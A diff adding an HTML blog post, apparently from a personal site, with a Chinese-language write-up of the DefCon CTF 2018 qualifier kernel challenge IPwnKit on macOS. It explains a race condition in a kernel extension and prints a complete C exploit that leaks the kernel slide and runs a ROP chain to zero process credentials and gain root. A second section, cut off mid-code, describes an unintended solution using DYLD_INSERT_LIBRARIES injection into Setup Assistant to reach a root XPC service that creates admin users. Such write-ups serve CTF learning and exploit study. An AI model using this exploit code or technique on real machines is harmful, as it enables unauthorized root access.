@@ -1,0 +1,348 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>DefConCTF Qualifier 2018 IPwnKit解题思路 | Sung3r&#39;s Blog</title>
+  <meta name="author" content="sung3r">
+  
+  <meta name="description" content="一道macOS内核题的解题思路">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="DefConCTF Qualifier 2018 IPwnKit解题思路"/>
+  <meta property="og:site_name" content="Sung3r&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Sung3r&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> DefConCTF Qualifier 2018 IPwnKit解题思路</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 一道macOS内核题的解题思路
+		 </div> <!-- alert -->
+	  		
+
+	  <h1 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h1><p>题目描述<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612101132633-1612101132849.png" alt="title"></p>
+<p>defcon 2018资格赛的原题，题目文件给了一个kext IOKit内核扩展模块以及kernel二进制文件，先把环境搭起来。本地环境是macOS 10.14.6 Mojave (18G103)，安装KDK 10.14.2<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612101155018-1612101155023.png" alt="title"></p>
+<p>为方便调试先关掉SIP，IPwnKit.kext复制到/System/Library/Extensions/，给权限，加载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo cp IPwnKit.kext &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;</span><br><span class="line">sudo chown -R root:wheel &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br><span class="line">sudo chmod -R 755 &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br><span class="line">sudo kextload &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br></pre></td></tr></table></figure>
+
+<p>替换成macOS 10.14.2的内核</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp &#x2F;Library&#x2F;Developer&#x2F;KDKs&#x2F;KDK\_10.14.2\_18C54.kdk&#x2F;System&#x2F;Library&#x2F;Kernels&#x2F;kernel.development &#x2F;System&#x2F;Library&#x2F;Kernels&#x2F;kernel</span><br></pre></td></tr></table></figure>
+
+<p>设置引导参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nvram boot-args&#x3D;&quot;debug&#x3D;0x141 kext-dev-mode&#x3D;1 kcsuffix&#x3D;development pmuflags&#x3D;1 -v&quot;</span><br><span class="line"></span><br><span class="line">sudo nvram boot-args&#x3D;&quot;debug&#x3D;0x144 kext-dev-mode&#x3D;1 kcsuffix&#x3D;development pmuflags&#x3D;1 -v&quot;</span><br></pre></td></tr></table></figure>
+
+<p>1&gt;&gt;boot-args：系统的启动参<br>2&gt;&gt;debug=0×141，表示系统可以进行远程链接调试<br>3&gt;&gt;kext-dev-mode=1允许加载未签名kext<br>4&gt;&gt;kcsuffix=development 允许我们启动系统，通过development，与之前我们copy到/Systems/Library/Kernel下的kernel.development对应，如果我们之前拷贝的是kernel.debug，那么这里填kcsuffic=debug<br>5&gt;&gt;pmuflags=1关闭定时器<br>6&gt;&gt;-v显示内核加载信息.</p>
+<p>清除kext cache使用新内核调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo kextcache -invalidate &#x2F;</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
+
+<p>lldb附加调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lldb</span><br><span class="line">(lldb) target create &#x2F;path&#x2F;to&#x2F;kernel.development</span><br><span class="line">(lldb) kdp-remote guest_ip</span><br></pre></td></tr></table></figure>
+
+<p>重启后装载IPwnKit.kext扩展</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo kextload &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612101201153-1612101201159.png" alt="title"></p>
+<p>该kext主要提供3个功能ReadNum、WriteNum和FillArray，利用IOConnectCallMethod方法对其进行调用</p>
+<p>调用<code>IPwnKitUserClient::sMethods</code>，主要是通过传入<code>IOExternalMethodDispatch</code>结构体参数，其中Methods可为ReadNum、WriteNum和FillArray等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct IOExternalMethodDispatch</span><br><span class="line">&#123;</span><br><span class="line">	IOExternalMethodAction function;</span><br><span class="line">	uint32_t           checkScalarInputCount;</span><br><span class="line">	uint32_t           checkStructureInputSize;</span><br><span class="line">	uint32_t           checkScalarOutputCount;</span><br><span class="line">	uint32_t           checkStructureOutputSize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><code>IOExternalMethodArguments</code>用于传递方法的参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct IOExternalMethodArguments</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	const uint64_t *    scalarInput;&#x2F;&#x2F;24-8</span><br><span class="line">	uint32_t        scalarInputCount;&#x2F;&#x2F;32-4</span><br><span class="line"></span><br><span class="line">	const void *    structureInput;&#x2F;&#x2F;36-8</span><br><span class="line">	uint32_t        structureInputSize;&#x2F;&#x2F;44-4</span><br><span class="line"></span><br><span class="line">	IOMemoryDescriptor * structureInputDescriptor;&#x2F;&#x2F;48-8</span><br><span class="line"></span><br><span class="line">	uint64_t *        scalarOutput;&#x2F;&#x2F;56-8</span><br><span class="line">	uint32_t        scalarOutputCount;&#x2F;&#x2F;64-4</span><br><span class="line"></span><br><span class="line">	void *        structureOutput;&#x2F;&#x2F;68-8</span><br><span class="line">	uint32_t        structureOutputSize;&#x2F;&#x2F;76-4</span><br><span class="line"></span><br><span class="line">	IOMemoryDescriptor * structureOutputDescriptor;&#x2F;&#x2F;8</span><br><span class="line">	uint32_t         structureOutputDescriptorSize;&#x2F;&#x2F;4</span><br><span class="line">	...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>审计这段代码，<code>arguments-&gt;structureInputDescriptor</code>是指向用户态空间的共享变量（sReadNum、ReadNum共享该变量），导致条件竞争漏洞。绕过size检查后，创建一个新线程，该线程在有效索引和越界索引之间反复更改索引参数字段，直到在输出结构中包含目标索引为止。在索引-30泄漏出内核地址，计算kernel slide。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">IOReturn IPwnKitUserClient::sReadNum(IPwnKitUserClient* target, void* reference, IOExternalMethodArguments* arguments)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	int64_t idx;</span><br><span class="line">	arguments-&gt;structureInputDescriptor-&gt;readBytes(0, &amp;idx, sizeof (idx));</span><br><span class="line">	if (idx &gt;&#x3D; sizeof (IPwnKitUserClient::myNumbers) || idx &lt; 0) &#123;</span><br><span class="line">		IOLog(&quot;invalid index %d\n&quot;, idx);</span><br><span class="line">		return KERN_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	return target-&gt;ReadNum(arguments);</span><br><span class="line">&#125;</span><br><span class="line">IOReturn IPwnKitUserClient::ReadNum(IOExternalMethodArguments *arguments) &#123;</span><br><span class="line">	IOLog(&quot;%s[%p]::%s reading number stored\n&quot;, getName(), this, __FUNCTION__);</span><br><span class="line">	read_num_t rnum;</span><br><span class="line">	arguments-&gt;structureInputDescriptor-&gt;readBytes(0, &amp;rnum, sizeof (read_num_t));</span><br><span class="line">	int64_t idx &#x3D; rnum.index;</span><br><span class="line">	arguments-&gt;scalarOutput[0] &#x3D; idx;</span><br><span class="line">	arguments-&gt;scalarOutput[1] &#x3D; this-&gt;myNumbers[idx];</span><br><span class="line"></span><br><span class="line">	return KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>fillArray</code>用作污染内核栈，执行内核rop，提权rop的编写参考该文章<br><a href="https://bazad.github.io/2016/05/mac-os-x-use-after-free/#building-the-rop-stack" target="_blank" rel="noopener">Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-1828</a></p>
+<p>在macOS 10.14.2 (18C54) kernel.development下的利用代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;IOKit&#x2F;IOKitLib.h&gt;</span><br><span class="line">#include &lt;CoreFoundation&#x2F;CoreFoundation.h&gt;</span><br><span class="line">#define kOpenUserClient 	0</span><br><span class="line">#define kCloseUserClient 	1</span><br><span class="line">#define kSayHi 			2</span><br><span class="line">#define kReadNum		3</span><br><span class="line">#define kWriteNum		4</span><br><span class="line">#define	kFillArray		5</span><br><span class="line">#define kIOKitClassName &quot;io_oooverflow_IPwnKit&quot;</span><br><span class="line">#define KERNEL_BASE_NO_SLID 0xFFFFFF8000100000ULL </span><br><span class="line">io_connect_t connection;</span><br><span class="line">kern_return_t OpenUserClient(void)&#123;</span><br><span class="line">	return IOConnectCallScalarMethod(connection,kOpenUserClient,0,0,0,0);</span><br><span class="line">&#125;</span><br><span class="line">kern_return_t CloseUserClient(void)&#123;</span><br><span class="line">	return IOConnectCallScalarMethod(connection,kCloseUserClient,0,0,0,0);</span><br><span class="line">&#125;</span><br><span class="line">kern_return_t SayHi(void)&#123;</span><br><span class="line">	return IOConnectCallScalarMethod(connection,kSayHi,0,0,0,0);</span><br><span class="line">&#125;</span><br><span class="line">const char pattern[] &#x3D; &quot;AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABY&quot;;</span><br><span class="line">struct result&#123;</span><br><span class="line">	int64_t idx;</span><br><span class="line">	int64_t res;</span><br><span class="line">&#125; out;</span><br><span class="line">struct args&#123;</span><br><span class="line">	int64_t idx;</span><br><span class="line">	int64_t res;</span><br><span class="line">	int64_t reserved[100000];</span><br><span class="line">&#125; Args;</span><br><span class="line">pthread_t racer,racer2;</span><br><span class="line">void handler(void)&#123;</span><br><span class="line">	pthread_exit(0);</span><br><span class="line">&#125;</span><br><span class="line">void Race2(int idx)&#123;</span><br><span class="line">	signal(SIGUSR1,handler);</span><br><span class="line">	while(out.idx!&#x3D;idx)&#123;</span><br><span class="line">		Args.idx&#x3D;idx;</span><br><span class="line">		Args.idx&#x3D;0x4f;</span><br><span class="line">	&#125;</span><br><span class="line">	pthread_exit(0);</span><br><span class="line">&#125;</span><br><span class="line">int64_t ReadNum(int64_t idx)&#123;</span><br><span class="line">	Args.idx&#x3D;idx;</span><br><span class="line">	int64_t outCnt&#x3D;2;</span><br><span class="line">	assert(0&#x3D;&#x3D;pthread_create(&amp;racer2,0,Race2,idx));</span><br><span class="line">	kern_return_t kr;</span><br><span class="line">	do&#123;</span><br><span class="line">		kr &#x3D; IOConnectCallMethod(connection,kReadNum,0,0,&amp;Args,sizeof(Args),&amp;out,&amp;outCnt,0,0);</span><br><span class="line">	&#125;while(kr||out.idx!&#x3D;idx);</span><br><span class="line">	return out.res;</span><br><span class="line">&#125;</span><br><span class="line">int64_t WriteNum(int64_t idx,int64_t value)&#123;</span><br><span class="line">	Args.idx&#x3D;idx;</span><br><span class="line">	Args.res&#x3D;value;</span><br><span class="line">	int64_t outCnt&#x3D;2;</span><br><span class="line">	assert(0&#x3D;&#x3D;pthread_create(&amp;racer2,0,Race2,idx));</span><br><span class="line">	kern_return_t kr;</span><br><span class="line">	do&#123;</span><br><span class="line">		kr &#x3D; IOConnectCallMethod(connection,kWriteNum,0,0,&amp;Args,sizeof(Args),&amp;out,&amp;outCnt,0,0);</span><br><span class="line">	&#125;while(kr||out.idx!&#x3D;idx);</span><br><span class="line">	return out.res;</span><br><span class="line">&#125;</span><br><span class="line">kern_return_t FillArray(int64_t* array,int64_t len)&#123;</span><br><span class="line">	memcpy(&amp;Args,array,len);</span><br><span class="line">	kern_return_t kr&#x3D;kIOReturnBadArgument;</span><br><span class="line">	int64_t outCnt&#x3D;1;</span><br><span class="line">	do&#123;</span><br><span class="line">		kr &#x3D; IOConnectCallMethod(connection,kFillArray,0,0,&amp;Args,sizeof(Args),&amp;out,&amp;outCnt,0,0);</span><br><span class="line">	&#125;while(kr&#x3D;&#x3D;kIOReturnBadArgument);</span><br><span class="line">	return kr;</span><br><span class="line">&#125;</span><br><span class="line">void IPwnConnect() &#123;</span><br><span class="line">	kern_return_t   kr;</span><br><span class="line">	mach_port_t     masterPort;</span><br><span class="line">	io_service_t    serviceObject;</span><br><span class="line">	io_iterator_t   iterator;</span><br><span class="line">	CFDictionaryRef classToMatch;</span><br><span class="line"></span><br><span class="line">	kr &#x3D; IOMasterPort(MACH_PORT_NULL, &amp;masterPort);</span><br><span class="line">	if (kr !&#x3D; KERN_SUCCESS) &#123;</span><br><span class="line">		printf(&quot;IOMasterPort returned %d\n&quot;, kr);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	classToMatch &#x3D; IOServiceMatching(kIOKitClassName);</span><br><span class="line">	if (classToMatch &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">		printf(&quot;IOServiceMatching returned a NULL dictionary\n&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kr &#x3D; IOServiceGetMatchingServices(masterPort, classToMatch, &amp;iterator);</span><br><span class="line">	if (kr !&#x3D; KERN_SUCCESS) &#123;</span><br><span class="line">		printf(&quot;IOServiceGetMatchingServices returned %d\n&quot;, kr);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	serviceObject &#x3D; IOIteratorNext(iterator);</span><br><span class="line">	IOObjectRelease(iterator);</span><br><span class="line">	if (!serviceObject) &#123;</span><br><span class="line">		printf(&quot;No service found\n&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kr &#x3D; IOServiceOpen(serviceObject, mach_task_self(), 0, &amp;connection);</span><br><span class="line">	IOObjectRelease(serviceObject);</span><br><span class="line">	if (kr !&#x3D; KERN_SUCCESS) &#123;</span><br><span class="line">		printf(&quot;IOServiceOpen returned %d\n&quot;, kr);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;&#x2F;&#x2F; Thanks @LinusHenze</span><br><span class="line">uint64_t GetKextAddr() &#123;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	char line[4096];</span><br><span class="line"></span><br><span class="line">	fp &#x3D; popen(&quot;kextstat | grep io.oooverflow.IPwnKit | awk &#39;&#123;print $3&#125;&#39;&quot;,&quot;r&quot;);</span><br><span class="line">	if(fp &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">		printf(&quot;Failed to get KEXT address!\n&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	fgets(line, sizeof(line)-1, fp);</span><br><span class="line">	uint64_t addr &#x3D; (uint64_t) strtoul(line, NULL, 16);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	return addr;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">	IPwnConnect();</span><br><span class="line">	OpenUserClient();</span><br><span class="line">	SayHi();</span><br><span class="line">	int64_t leaked &#x3D; ReadNum(-30);</span><br><span class="line">	int64_t slide &#x3D; leaked-GetKextAddr()-0x2070;</span><br><span class="line">	int64_t base &#x3D; KERNEL_BASE_NO_SLID + slide;</span><br><span class="line">	printf(&quot;[*] Kernel Text Base 0x%llx\n&quot;,base);</span><br><span class="line">	printf(&quot;[*] Kernel Slide 0x%llx\n&quot;,slide);</span><br><span class="line">	printf(&quot;[*] Corrupting copy length value with:%lld\n&quot;,WriteNum(-1,28LL&lt;&lt;32)&gt;&gt;32);</span><br><span class="line">	puts(&quot;[*] Smashing the kernel stack for root&quot;);</span><br><span class="line">	unsigned long long ropchain[] &#x3D;&#123;&#x2F;&#x2F;put this at offset 14*8 so we can check rbp for magic value</span><br><span class="line">		0xdeadbeecULL,</span><br><span class="line">		slide + 0xFFFFFF8000964EB0,	&#x2F;&#x2F; 0xffffff80009c20c0,&#x2F;&#x2F;current_proc</span><br><span class="line">		slide + 0xffffff80002ad153,	&#x2F;&#x2F; 0xffffff800056eaf3,&#x2F;&#x2F;pop rcx ; ret</span><br><span class="line">		slide + 0xFFFFFF800081E5F0,	&#x2F;&#x2F; 0xffffff80008c3fb0,&#x2F;&#x2F;proc_ucred</span><br><span class="line">		slide + 0xffffff80009885d6,	&#x2F;&#x2F; 0xffffff80009e5926,&#x2F;&#x2F;mov rdi, rax ; pop rbp ; jmp rcx</span><br><span class="line">		0xdeadbeedULL,</span><br><span class="line">		slide + 0xffffff80002ad153,	&#x2F;&#x2F; 0xffffff800056eaf3,&#x2F;&#x2F;pop rcx ; ret</span><br><span class="line">		slide + 0xFFFFFF80007DC350,	&#x2F;&#x2F; 0xffffff800088ab70,&#x2F;&#x2F;posix_cred_get</span><br><span class="line">		slide + 0xffffff80009885d6,	&#x2F;&#x2F; 0xffffff80009e5926,&#x2F;&#x2F;mov rdi, rax ; pop rbp ; jmp rcx</span><br><span class="line">		0xdeadbeeeULL,</span><br><span class="line">		slide + 0xffffff8000a293ed,	&#x2F;&#x2F; 0xffffff8000a890cd, &#x2F;&#x2F; mov qword ptr [rax + 8], 0 ; pop rbp ; ret</span><br><span class="line">		0xdeadbeefULL,</span><br><span class="line">		slide + 0xFFFFFF8000221DCA,	&#x2F;&#x2F; 0xffffff800035adca&#x2F;&#x2F;thread_exception_return</span><br><span class="line">	&#125;;</span><br><span class="line">	int64_t* payload &#x3D; malloc(224);</span><br><span class="line">	memcpy(payload,pattern,224);</span><br><span class="line">	memcpy(payload+14,ropchain,sizeof(ropchain));</span><br><span class="line">	FillArray(payload,224);</span><br><span class="line">	CloseUserClient();</span><br><span class="line">	setuid(0);</span><br><span class="line">	setuid(0);</span><br><span class="line">	&#x2F;&#x2F;system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">	system(&quot;cat &#x2F;var&#x2F;root&#x2F;flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提权读flag<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612101226137-1612101226142.png" alt="title"></p>
+<h1 id="非预期解法-利用macOS本身的提权漏洞"><a href="#非预期解法-利用macOS本身的提权漏洞" class="headerlink" title="非预期解法(利用macOS本身的提权漏洞)"></a>非预期解法(利用macOS本身的提权漏洞)</h1><p><code>DYLD_INSERT_LIBRARIES</code>先注入一个签名为二进制的苹果，然后与特权XPC服务通信</p>
+<p>在漏洞利用程序中，选择<code>/System/Library/CoreServices/Setup Assistant.app/Contents/MacOS/Setup Assistant</code>借用其<code>com.apple.private.mbsystemadministration</code>权限，因此可以与<code>com.apple.mbsystemadministration</code>进行通信</p>
+<p>该服务以root身份运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ ps aux | grep systemadministration</span><br><span class="line">root              1763   0.0  0.2  4383484  28312   ??  Ss    3:48PM   0:00.14 &#x2F;System&#x2F;Library&#x2F;CoreServices&#x2F;Setup Assistant.app&#x2F;Contents&#x2F;Resources&#x2F;mbsystemadministration</span><br></pre></td></tr></table></figure>
+
+<p>XPC的导出方法有创建具有管理员特权（sudoer）的任意用户的方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@protocol MBSAProtocol &lt;NSObject&gt;</span><br><span class="line">- (void)createUserWithInfo:(NSDictionary *)arg1</span><br><span class="line">          completionBlock:(void (^)(unsigned int))arg2;</span><br><span class="line">@end</span><br></pre></td></tr></table></figure>
+
+<p>exploit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 